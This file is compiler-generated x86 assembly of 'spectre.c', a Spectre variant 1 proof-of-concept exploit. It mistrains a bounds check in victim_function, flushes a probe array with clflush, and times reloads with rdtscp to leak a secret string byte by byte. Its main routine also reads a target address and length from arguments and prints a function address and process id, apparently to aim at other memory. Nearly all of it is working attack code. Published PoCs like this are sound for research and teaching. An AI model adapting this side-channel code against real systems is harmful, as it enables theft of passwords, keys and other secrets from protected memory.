	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR array1_size@GOTOFF[eax]
	cmp	eax, DWORD PTR 4[esp]
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5563:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	edx, DWORD PTR 4[esp]
	mov	ecx, DWORD PTR array1_size@GOTOFF[eax]
	cmp	ecx, edx
	jbe	.L2
	movzx	edx, BYTE PTR array1@GOTOFF[eax+edx*2]
	sal	edx, 9
	movzx	edx, BYTE PTR array2@GOTOFF[eax+edx]
	and	BYTE PTR temp@GOTOFF[eax], dl
.L2:
	ret
	.cfi_endproc
.LFE5563:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5564:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	push	edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	push	esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	push	ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	sub	esp, 76
	.cfi_def_cfa_offset 96
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	DWORD PTR 16[esp], ebx
	mov	eax, DWORD PTR 100[esp]
	mov	DWORD PTR 40[esp], eax
	mov	eax, DWORD PTR 104[esp]
	mov	DWORD PTR 44[esp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR 60[esp], eax
	xor	eax, eax
	mov	DWORD PTR 52[esp], 0
	lea	eax, results.0@GOTOFF[ebx]
	lea	edx, 1024[eax]
.L5:
	mov	DWORD PTR [eax], 0
	add	eax, 4
	cmp	edx, eax
	jne	.L5
	mov	DWORD PTR 28[esp], 999
	mov	eax, DWORD PTR 16[esp]
	lea	eax, array2@GOTOFF[eax]
	mov	DWORD PTR 36[esp], eax
	jmp	.L6
.L8:
	mov	eax, ebp
	imul	ebx
	mov	eax, ebp
	sar	eax, 31
	sub	edx, eax
	lea	edx, [edx+edx*2]
	add	edx, edx
	mov	eax, ebp
	sub	eax, edx
	sub	eax, 1
	mov	ecx, eax
	mov	cx, 0
	shr	eax, 16
	mov	edx, edi
	xor	edx, DWORD PTR 96[esp]
	or	eax, ecx
	and	edx, eax
	xor	edx, edi
	push	edx
	.cfi_def_cfa_offset 100
	call	victim_function
	sub	ebp, 1
	add	esp, 4
	.cfi_def_cfa_offset 96
	cmp	ebp, -1
	je	.L29
.L10:
	clflush	[esi]
	mov	DWORD PTR 56[esp], 0
	mov	eax, DWORD PTR 56[esp]
	cmp	eax, 99
	jg	.L8
.L9:
	mov	eax, DWORD PTR 56[esp]
	add	eax, 1
	mov	DWORD PTR 56[esp], eax
	mov	eax, DWORD PTR 56[esp]
	cmp	eax, 99
	jle	.L9
	jmp	.L8
.L29:
	mov	esi, 13
	mov	eax, DWORD PTR 16[esp]
	lea	eax, results.0@GOTOFF[eax]
	mov	DWORD PTR 24[esp], eax
	mov	DWORD PTR 32[esp], ebp
	mov	ebx, esi
	mov	ebp, DWORD PTR 36[esp]
	jmp	.L12
.L31:
	mov	eax, DWORD PTR 24[esp]
	add	DWORD PTR [eax+esi*4], 1
.L11:
	add	ebx, 167
	cmp	ebx, 42765
	je	.L30
.L12:
	movzx	esi, bl
	mov	edi, esi
	sal	edi, 9
	rdtscp
	mov	DWORD PTR 8[esp], eax
	mov	DWORD PTR 12[esp], edx
	mov	DWORD PTR 52[esp], ecx
	movzx	eax, BYTE PTR 0[ebp+edi]
	rdtscp
	mov	DWORD PTR 52[esp], ecx
	sub	eax, DWORD PTR 8[esp]
	sbb	edx, DWORD PTR 12[esp]
	mov	ecx, edx
	mov	edx, eax
	mov	eax, 100
	cmp	eax, edx
	mov	eax, 0
	sbb	eax, ecx
	jc	.L11
	mov	edi, DWORD PTR 16[esp]
	mov	ecx, DWORD PTR array1_size@GOTOFF[edi]
	mov	eax, DWORD PTR 20[esp]
	cdq
	idiv	ecx
	movzx	eax, BYTE PTR array1@GOTOFF[edi+edx]
	cmp	eax, esi
	jne	.L31
	jmp	.L11
.L30:
	mov	ebp, DWORD PTR 32[esp]
	mov	eax, 0
	mov	edx, 0
	mov	ebx, DWORD PTR 16[esp]
	lea	ebx, results.0@GOTOFF[ebx]
	jmp	.L13
.L19:
	mov	ebp, edx
	mov	edx, eax
.L13:
	add	eax, 1
	cmp	eax, 256
	je	.L32
	test	edx, edx
	js	.L19
	mov	esi, DWORD PTR 16[esp]
	mov	ecx, DWORD PTR results.0@GOTOFF[esi+eax*4]
	cmp	ecx, DWORD PTR [ebx+edx*4]
	jge	.L20
	test	ebp, ebp
	js	.L21
	cmp	ecx, DWORD PTR [ebx+ebp*4]
	cmovge	ebp, eax
	jmp	.L13
.L20:
	mov	ebp, edx
	mov	edx, eax
	jmp	.L13
.L21:
	mov	ebp, eax
	jmp	.L13
.L32:
	mov	eax, DWORD PTR 16[esp]
	lea	ecx, results.0@GOTOFF[eax]
	mov	eax, DWORD PTR [ecx+ebp*4]
	mov	ecx, DWORD PTR [ecx+edx*4]
	lea	ebx, 4[eax+eax]
	cmp	ebx, ecx
	jl	.L16
	test	eax, eax
	jne	.L22
	cmp	ecx, 2
	je	.L16
.L22:
	sub	DWORD PTR 28[esp], 1
	je	.L16
.L6:
	mov	eax, DWORD PTR 28[esp]
	mov	DWORD PTR 20[esp], eax
	mov	eax, DWORD PTR 16[esp]
	lea	eax, array2@GOTOFF[eax]
	lea	edx, 131072[eax]
.L7:
	clflush	[eax]
	add	eax, 512
	cmp	eax, edx
	jne	.L7
	mov	ebx, DWORD PTR 16[esp]
	mov	esi, DWORD PTR array1_size@GOTOFF[ebx]
	mov	eax, DWORD PTR 20[esp]
	cdq
	idiv	esi
	mov	edi, edx
	mov	ebp, 29
	lea	esi, array1_size@GOTOFF[ebx]
	mov	ebx, 715827883
	jmp	.L10
.L16:
	mov	ebx, DWORD PTR 16[esp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx]
	xor	eax, DWORD PTR 52[esp]
	mov	DWORD PTR results.0@GOTOFF[ebx], eax
	mov	esi, DWORD PTR 40[esp]
	mov	BYTE PTR [esi], dl
	lea	eax, results.0@GOTOFF[ebx]
	mov	edx, DWORD PTR [eax+edx*4]
	mov	ecx, DWORD PTR 44[esp]
	mov	DWORD PTR [ecx], edx
	mov	ebx, ebp
	mov	BYTE PTR 1[esi], bl
	mov	eax, DWORD PTR [eax+ebp*4]
	mov	DWORD PTR 4[ecx], eax
	mov	eax, DWORD PTR 60[esp]
	sub	eax, DWORD PTR gs:20
	jne	.L33
	add	esp, 76
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L33:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5564:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.4
	.align 4
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5565:
	.cfi_startproc
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	edi
	push	esi
	push	ebx
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	sub	esp, 72
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR [ecx]
	mov	DWORD PTR -80[ebp], eax
	mov	eax, DWORD PTR 4[ecx]
	mov	DWORD PTR -84[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	xor	eax, eax
	mov	eax, DWORD PTR stdin@GOT[ebx]
	mov	DWORD PTR -64[ebp], eax
	lea	eax, check@GOTOFF[ebx]
	mov	DWORD PTR -76[ebp], eax
.L35:
	sub	esp, 12
	mov	eax, DWORD PTR -64[ebp]
	push	DWORD PTR [eax]
	call	getc@PLT
	add	esp, 16
	cmp	al, 114
	je	.L54
	cmp	al, 10
	je	.L35
	cmp	al, 105
	jne	.L46
	call	getpid@PLT
	sub	esp, 12
	push	eax
	mov	eax, DWORD PTR -76[ebp]
	cdq
	add	eax, 33
	adc	edx, 0
	push	edx
	push	eax
	lea	eax, .LC12@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L35
.L54:
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	push	eax
	push	eax
	lea	eax, .LC2@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	lea	ecx, array1@GOTOFF[ebx]
	mov	edx, eax
	sub	edx, ecx
	mov	DWORD PTR -48[ebp], edx
	mov	DWORD PTR [esp], eax
	call	strlen@PLT
	add	esp, 16
	mov	DWORD PTR -44[ebp], eax
	lea	eax, array2@GOTOFF[ebx]
	lea	edx, 131072[eax]
.L37:
	mov	BYTE PTR [eax], 1
	add	eax, 1
	cmp	eax, edx
	jne	.L37
	cmp	DWORD PTR -80[ebp], 3
	je	.L55
.L38:
	sub	esp, 4
	push	DWORD PTR -44[ebp]
	lea	eax, .LC6@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	add	esp, 16
	test	eax, eax
	js	.L35
	mov	DWORD PTR -60[ebp], 0
	lea	eax, .LC7@GOTOFF[ebx]
	mov	DWORD PTR -68[ebp], eax
	lea	eax, .LC1@GOTOFF[ebx]
	mov	DWORD PTR -72[ebp], eax
	jmp	.L44
.L55:
	sub	esp, 4
	lea	eax, -48[ebp]
	push	eax
	lea	eax, .LC3@GOTOFF[ebx]
	push	eax
	mov	esi, DWORD PTR -84[ebp]
	push	DWORD PTR 4[esi]
	call	__isoc99_sscanf@PLT
	lea	eax, array1@GOTOFF[ebx]
	sub	DWORD PTR -48[ebp], eax
	add	esp, 12
	lea	eax, -44[ebp]
	push	eax
	lea	eax, .LC4@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 8[esi]
	call	__isoc99_sscanf@PLT
	push	DWORD PTR -44[ebp]
	push	DWORD PTR -48[ebp]
	lea	eax, .LC5@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L38
.L42:
	sub	esp, 8
	lea	eax, .LC11@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	add	esp, 16
	test	eax, eax
	js	.L35
.L44:
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	mov	edi, DWORD PTR -60[ebp]
	movsx	eax, BYTE PTR [eax+edi]
	push	eax
	push	DWORD PTR -48[ebp]
	push	DWORD PTR -68[ebp]
	push	1
	call	__printf_chk@PLT
	add	edi, 1
	mov	DWORD PTR -60[ebp], edi
	add	esp, 12
	lea	eax, -40[ebp]
	push	eax
	lea	eax, -30[ebp]
	push	eax
	mov	eax, DWORD PTR -48[ebp]
	shr	eax
	push	eax
	call	readMemoryByte
	add	DWORD PTR -48[ebp], 1
	mov	edi, DWORD PTR -40[ebp]
	mov	esi, DWORD PTR -36[ebp]
	lea	eax, [esi+esi]
	add	esp, 12
	cmp	edi, eax
	lea	eax, .LC0@GOTOFF[ebx]
	cmovl	eax, DWORD PTR -72[ebp]
	push	eax
	lea	eax, .LC8@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	movzx	eax, BYTE PTR -30[ebp]
	lea	edx, -32[eax]
	cmp	dl, 94
	mov	edx, 63
	cmovbe	edx, eax
	mov	DWORD PTR [esp], edi
	movzx	edx, dl
	push	edx
	movzx	eax, al
	push	eax
	lea	eax, .LC9@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	test	esi, esi
	jle	.L42
	movzx	eax, BYTE PTR -29[ebp]
	lea	edx, -32[eax]
	cmp	dl, 94
	mov	edx, 63
	cmovbe	edx, eax
	sub	esp, 12
	push	esi
	movzx	edx, dl
	push	edx
	movzx	eax, al
	push	eax
	lea	eax, .LC10@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L42
.L46:
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	jne	.L56
	mov	eax, 0
	lea	esp, -16[ebp]
	pop	ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
.L56:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5566:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5566:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB5567:
	.cfi_startproc
	mov	ebx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5567:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
